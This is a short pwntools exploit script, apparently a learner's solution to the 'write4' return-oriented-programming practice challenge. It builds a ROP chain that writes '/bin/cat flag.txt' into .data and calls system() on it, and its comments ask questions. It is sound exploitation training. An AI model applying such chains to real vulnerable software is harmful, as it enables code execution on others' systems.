#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

N = cyclic_find('faaaaaaag', n=8)

e = ELF('write4')
print(e.symbols)

rop = ROP(e)

data = e.get_section_by_name('.data').header['sh_addr']
mov_qword_r14_r15 = 0x0000000000400820 # How do I find this using pwnlib?
pop_r14_r15 = rop.search(regs=['r14', 'r15'])

print(hex(data))

def save_string(rop, string, dest):
    while len(string) % 8 != 0:
        string += b'\x00'

    for i in range(int(len(string) / 8)):
        s = string[i*8:(i+1)*8]

        rop.raw(pop_r14_r15)
        rop.raw(data + i*8)
        rop.raw(u64(s)) # Why is it padding my string?
        rop.raw(mov_qword_r14_r15)

s = b"/bin/cat flag.txt"
save_string(rop, s, data)

rop.system(data)
print(rop.dump())

open('input.txt', 'wb').write(b'A' * N + rop.chain() + b'\n')
